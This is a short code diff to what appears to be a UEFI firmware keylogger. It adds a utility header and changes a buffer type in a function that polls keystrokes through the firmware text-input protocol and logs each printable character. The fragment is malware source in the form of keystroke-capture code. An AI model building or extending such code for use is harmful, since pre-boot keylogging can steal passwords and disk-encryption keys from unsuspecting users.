@@ -1,4 +1,5 @@
 #include "Keylogger.h"
+#include "../Shared/Utils.h"
 #include "../Shared/Logger.h"
 
 static EFI_SIMPLE_TEXT_INPUT_PROTOCOL* TextIn = NULL;
@@ -31,7 +32,7 @@ VOID PollKeystrokes(void) {
     if (EFI_ERROR(Status)) return;
 
     if (Key.UnicodeChar >= 32 && Key.UnicodeChar <= 126) {
-        WCHAR Buffer[2] = { Key.UnicodeChar, L'\0' };
+        CHAR16 Buffer[2] = { Key.UnicodeChar, L'\0' };
         LogInfo(Buffer);  
     }
 }
